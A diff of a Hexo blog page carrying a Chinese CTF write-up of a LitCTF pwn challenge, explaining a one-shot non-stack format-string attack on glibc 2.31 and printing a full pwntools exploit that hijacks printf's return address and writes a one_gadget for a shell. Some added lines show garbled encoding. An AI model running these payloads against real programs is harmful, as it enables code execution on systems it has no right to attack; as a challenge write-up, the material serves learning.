@@ -14,10 +14,10 @@
 
   
 
-  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
   
   <title>
-    LitCTF |
+    非栈上的fmt |
     
     Hexo
   </title>
@@ -37,7 +37,7 @@
   
     <meta name="description" content="一次有趣的非栈上格式化字符串攻击参考:孤鸿师傅的博客 题目链接:NSS靶场 前言:litctf中出现的一道奇怪的题目,打完比赛后gets师傅告诉我这种题出现过几次,还甩给我一篇博客.结果打开一看,发现是楠哥的文章. 世界可真小 glibc的知识怎么永远学不完啊 题目分析 题目给了我们栈地址和libc地址,,并给了我们一次非栈上格式化字符串的机会,之后立马使用_exit(0)退出 由于使用的是_ex">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LitCTF">
+<meta property="og:title" content="非栈上的fmt">
 <meta property="og:url" content="https://khighl.github.io.git/2025/05/27/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84fmt/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="一次有趣的非栈上格式化字符串攻击参考:孤鸿师傅的博客 题目链接:NSS靶场 前言:litctf中出现的一道奇怪的题目,打完比赛后gets师傅告诉我这种题出现过几次,还甩给我一篇博客.结果打开一看,发现是楠哥的文章. 世界可真小 glibc的知识怎么永远学不完啊 题目分析 题目给了我们栈地址和libc地址,,并给了我们一次非栈上格式化字符串的机会,之后立马使用_exit(0)退出 由于使用的是_ex">
@@ -46,10 +46,8 @@
 <meta property="og:image" content="https://khighl.github.io.git/images/fmt/1748335453145.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/fmt/1748335538861.png">
 <meta property="article:published_time" content="2025-05-26T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-05-27T10:04:15.991Z">
+<meta property="article:modified_time" content="2026-03-24T01:55:12.661Z">
 <meta property="article:author" content="zer00ne">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://khighl.github.io.git/images/fmt/1748334264961.png">
   
@@ -96,7 +94,7 @@
           </svg>
         
       </div>
-      <div class="loading-word">少女祈祷中...</div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
     </div>
   </div>
   </div>
@@ -183,7 +181,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="LitCTF">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="非栈上的fmt">
         
       
     
@@ -194,7 +192,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">LitCTF</h1>
+            <h1 data-aos="slide-up">非栈上的fmt</h1>
           </a>
         
       
@@ -234,15 +232,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -311,11 +309,15 @@
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-05-26T16:00:00.000Z" itemprop="datePublished">2025-05-27</time>
-    <time style="display: none;" id="post-update-time">2025-05-27</time>
+    <time style="display: none;" id="post-update-time">2026-03-24</time>
   </span>
 </div>
 
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/" data-aos="zoom-in">ctf</a>
+  </div>
+
 
     </div>
     <div class="hr-line"></div>
@@ -327,8 +329,8 @@
         <h1 id="一次有趣的非栈上格式化字符串攻击"><a href="#一次有趣的非栈上格式化字符串攻击" class="headerlink" title="一次有趣的非栈上格式化字符串攻击"></a>一次有趣的非栈上格式化字符串攻击</h1><p>参考:<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/a523e26a.html#%E4%B8%80%E6%AC%A1%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%BB%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%8C%87%E9%92%88">孤鸿师傅的博客</a></p>
 <p>题目链接:<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6791">NSS靶场</a></p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>litctf中出现的一道奇怪的题目,打完比赛后gets师傅告诉我这种题出现过几次,还甩给我一篇博客.结果打开一看,发现是楠哥的文章.</p>
-<p><del>世界可真小</del></p>
-<p><del>glibc的知识怎么永远学不完啊</del></p>
+<p>世界可真小</p>
+<p>glibc的知识怎么永远学不完啊</p>
 <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/images/fmt/1748334264961.png" alt="1748334264961"></p>
 <p>题目给了我们栈地址和libc地址,,并给了我们一次非栈上格式化字符串的机会,之后立马使用_exit(0)退出</p>
 <p>由于使用的是_exit(0)我们无法使用exit_hook或FSOP</p>
@@ -336,30 +338,35 @@
 <h3 id="回顾-非栈上格式化字符串实现任意地址写"><a href="#回顾-非栈上格式化字符串实现任意地址写" class="headerlink" title="回顾:非栈上格式化字符串实现任意地址写"></a>回顾:非栈上格式化字符串实现任意地址写</h3><p>在常规的非栈上格式化字符串利用中,我们总是有着无限的格式化机会</p>
 <p>我们会</p>
 <ul>
-<li>修改栈上的<strong>三联栈链</strong>,使得链尾的地址在栈上拥有一个可以指向任意栈地址的<strong>二联栈链</strong></li>
-<li>然后对二联栈链进行格式化攻击,使得<code>返回地址</code>&#x2F;<code>got</code>表被修改</li>
+<li><p>修改栈上的三联栈链,使得链尾的地址在栈上拥有一个可以指向任意栈地址的二联栈链</p>
+</li>
+<li><p>然后对二联栈链进行格式化攻击,使得返回地址&#x2F;got表被修改</p>
+</li>
 </ul>
-<p>可以看到常规的一次非栈上格式化字符串攻击至少需要两次<code>printf</code>调用,很明显此时我们没有这个条件</p>
-<h3 id="新手法-利用包含-符和非-符的解析速度差异一次性修改三联栈链和二联栈链"><a href="#新手法-利用包含-符和非-符的解析速度差异一次性修改三联栈链和二联栈链" class="headerlink" title="新手法:利用包含$符和非$符的解析速度差异一次性修改三联栈链和二联栈链"></a>新手法:利用包含<code>$符</code>和<code>非$符</code>的解析速度差异一次性修改<code>三联栈链</code>和<code>二联栈链</code></h3><p>我们知道,<code>$xxxp</code>会被直接解析为第<code>xxx</code>个参数的地址,比如我们想表示第九个参数的地址,可以使用<code>%9$p</code></p>
-<p>但我们还有另一种手法,还记得刚刚学格式化字符串时的<code>%p%p%p%p%p%p...</code></p>
+<p>可以看到常规的一次非栈上格式化字符串攻击至少需要两次printf调用,很明显此时我们没有这个条件</p>
+<h3 id="新手法-利用包含-符和非-符的解析速度差异一次性修改三联栈链和二联栈链"><a href="#新手法-利用包含-符和非-符的解析速度差异一次性修改三联栈链和二联栈链" class="headerlink" title="新手法:利用包含$符和非$符的解析速度差异一次性修改三联栈链和二联栈链"></a>新手法:利用包含$符和非$符的解析速度差异一次性修改三联栈链和二联栈链</h3><p>我们知道,$xxxp会被直接解析为第xxx个参数的地址,比如我们想表示第九个参数的地址,可以使用%9$p</p>
+<p>但我们还有另一种手法,还记得刚刚学格式化字符串时的%p%p%p%p%p%p…</p>
 <p>每一个%符都会将解析符号对应的参数自动向后移动</p>
-<p>如果我们使用了8个<code>%p</code>,然后使用<code>%n</code>,此时前8个<code>%p</code>被打印出的字符串长度就会被写入第<code>九个参数指向的地址</code></p>
-<h3 id="第一枚攻击载荷"><a href="#第一枚攻击载荷" class="headerlink" title="第一枚攻击载荷"></a>第一枚攻击载荷</h3><p>那我们就可以使用这个手法,实现在栈上写入一个包含<code>printf</code>返回地址的<code>三联栈链,</code>同时对返回地址进行修改,使得执行流回到<code>read</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=ret&amp;<span class="number">0xffff</span><span class="comment">#ret为printf返回地址</span></span><br><span class="line">payload =<span class="string">b&quot;%p&quot;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;key-<span class="number">92</span>&#125;</span>c%hn&quot;</span>.encode()<span class="comment">#92为9个%p打印出的字符串的长度</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x100BA</span>-key&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *$rebase(0x8DC)&quot;)</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果我们使用了8个%p,然后使用%n,此时前8个%p被打印出的字符串长度就会被写入第九个参数指向的地址</p>
+<h3 id="第一枚攻击载荷"><a href="#第一枚攻击载荷" class="headerlink" title="第一枚攻击载荷"></a>第一枚攻击载荷</h3><p>那我们就可以使用这个手法,实现在栈上写入一个包含printf返回地址的三联栈链,同时对返回地址进行修改,使得执行流回到read</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key=ret&amp;<span class="number">0xffff</span><span class="comment">#ret为printf返回地址</span></span><br><span class="line">payload =<span class="string">b&quot;%p&quot;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;key-<span class="number">92</span>&#125;</span>c%hn&quot;</span>.encode()<span class="comment">#92为9个%p打印出的字符串的长度</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x100BA</span>-key&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *$rebase(0x8DC)&quot;)</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#1</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到,我们成功将返回地址修改为read,此时我们可以进行二次读入</p>
 <p><img src="/images/fmt/1748335453145.png" alt="1748335453145"></p>
 <p>同时还拥有了三联和二联栈链</p>
 <p><img src="/images/fmt/1748335538861.png" alt="1748335538861"></p>
-<p>在后续的攻击中,我们可以直接对<code>%39$hn</code>进行修改,就不需要再使用大量<code>%p</code>与<code>%n</code>竞争了</p>
-<p>同时我们还通过大量<code>%p</code>获得了<code>PIE</code>,现在可以使用elf中的gadget了</p>
+<p>在后续的攻击中,我们可以直接对%39$hn进行修改,就不需要再使用大量%p与%n竞争了</p>
+<p>同时我们还通过大量%p获得了PIE,现在可以使用elf中的gadget了</p>
 <h3 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h3><p>此时我们拥有了无限次格式化字符串的机会,那问题就转化为了普通的非栈上格式化字符串问题</p>
 <ul>
-<li>不过有一点需要注意的就是我们已经占用了一条栈链用于修改返回地址,我们想要继续利用还需要另一条三联栈链.刚刚好,栈中一般都会有包含<code>elf文件名</code>和<code>/bin/bash</code>的栈链</li>
-<li>同时我们不能直接对printf的返回地址进行修改,而是对printf返回地址的下一条地址进行修改,修改好后一次性把printf返回地址修改为elf中一个ret的地址,这样就不会影响无限次的格式化机会</li>
-<li>本题中刚刚好有一个one_gadget可以在printf返回时被使用,这就节约了我们几步</li>
+<li><p>不过有一点需要注意的就是我们已经占用了一条栈链用于修改返回地址,我们想要继续利用还需要另一条三联栈链.刚刚好,栈中一般都会有包含elf文件名和&#x2F;bin&#x2F;bash的栈链</p>
+</li>
+<li><p>同时我们不能直接对printf的返回地址进行修改,而是对printf返回地址的下一条地址进行修改,修改好后一次性把printf返回地址修改为elf中一个ret的地址,这样就不会影响无限次的格式化机会</p>
+</li>
+<li><p>本题中刚刚好有一个one_gadget可以在printf返回时被使用,这就节约了我们几步</p>
+</li>
 </ul>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;node1.anna.nssctf.cn&quot;,28653)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ift 1 is &quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ift 2 is &quot;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;stack=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>\nbase=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br><span class="line">ret=stack-<span class="number">15</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ret-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(ret)&#125;</span>&quot;</span>)</span><br><span class="line">key=ret&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">one=base+<span class="number">0xe3b01</span></span><br><span class="line">t1=one&amp;<span class="number">0xffff</span></span><br><span class="line">t2=(one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">t3=(one&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t3))</span><br><span class="line">payload =<span class="string">b&quot;%p&quot;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;key-<span class="number">92</span>&#125;</span>c%hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x100BA</span>-key&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *$rebase(0x8DC)&quot;</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#1</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x201060</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t1&#125;</span>c%41$hn%<span class="subst">&#123;<span class="number">0x1000BA</span>-t1&#125;</span>c%39$hhn&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#3</span></span><br><span class="line"><span class="comment">#================================================================</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>+<span class="number">2</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>-<span class="number">2</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn\x00&quot;</span></span><br><span class="line"></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t2&#125;</span>c%41$hn%<span class="subst">&#123;<span class="number">0x1000BA</span>-t2&#125;</span>c%39$hhn\x00&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#5</span></span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>+<span class="number">4</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>-<span class="number">4</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn\x00&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t3&#125;</span>c%41$n%<span class="subst">&#123;<span class="number">0x1000BA</span>-t3&#125;</span>c%39$hhn\x00&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#7</span></span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">ret=(pie+<span class="number">0x954</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;ret&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hn\x00&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#8</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;node1.anna.nssctf.cn&quot;,28653)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ift 1 is &quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ift 2 is &quot;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;stack=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>\nbase=&gt;<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br><span class="line">ret=stack-<span class="number">15</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ret-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(ret)&#125;</span>&quot;</span>)</span><br><span class="line">key=ret&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">one=base+<span class="number">0xe3b01</span></span><br><span class="line">t1=one&amp;<span class="number">0xffff</span></span><br><span class="line">t2=(one&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">t3=(one&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(t3))</span><br><span class="line">payload =<span class="string">b&quot;%p&quot;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;key-<span class="number">92</span>&#125;</span>c%hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x100BA</span>-key&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *$rebase(0x8DC)&quot;</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#1</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x201060</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t1&#125;</span>c%41$hn%<span class="subst">&#123;<span class="number">0x1000BA</span>-t1&#125;</span>c%39$hhn&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#3</span></span><br><span class="line"><span class="comment">#================================================================</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>+<span class="number">2</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>-<span class="number">2</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn\x00&quot;</span></span><br><span class="line"></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t2&#125;</span>c%41$hn%<span class="subst">&#123;<span class="number">0x1000BA</span>-t2&#125;</span>c%39$hhn\x00&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#5</span></span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">payload =<span class="string">f&quot;%<span class="subst">&#123;key+<span class="number">8</span>+<span class="number">4</span>&#125;</span>c%27$hn&quot;</span>.encode()</span><br><span class="line">payload+=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1000BA</span>-key-<span class="number">8</span>-<span class="number">4</span>&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hhn\x00&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;t3&#125;</span>c%41$n%<span class="subst">&#123;<span class="number">0x1000BA</span>-t3&#125;</span>c%39$hhn\x00&quot;</span>.encode()</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#7</span></span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">ret=(pie+<span class="number">0x954</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;ret&#125;</span>c&quot;</span>.encode()+<span class="string">b&quot;%39$hn\x00&quot;</span></span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#8</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -373,8 +380,6 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
-
 
     </footer>
   </div>
@@ -386,14 +391,14 @@
         
           
           
-            <img data-src="/covers/er.jpg" data-sizes="auto" alt="arm合集" class="lazyload">
+            <img data-src="/covers/er.jpg" data-sizes="auto" alt="arm基础" class="lazyload">
           
         
         <a href="/2025/05/29/arm%E5%9F%BA%E7%A1%80/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            arm合集
+            arm基础
           
         </h3>
       </div>
@@ -457,10 +462,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        74.8k
+        71.3k
